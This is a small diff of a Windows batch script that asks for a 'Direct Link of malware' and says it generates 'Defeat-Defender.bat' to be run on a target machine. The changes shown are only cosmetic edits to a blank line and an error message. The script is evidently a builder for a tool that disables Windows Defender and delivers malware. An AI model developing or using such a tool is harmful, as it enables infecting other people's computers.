@@ -2,6 +2,7 @@
 type banner.txt
 color 0a
 echo.
+
 echo.
 set /p a="Enter the Direct Link of malware : "
 if [%a%]==[] ( 
@@ -28,4 +29,4 @@ echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
 EXIT /B %ERRORLEVEL% 
 :error
 echo.
-echo Please Enter link And Try Again!!!
+echo Please Enter the link And Try Again!!!
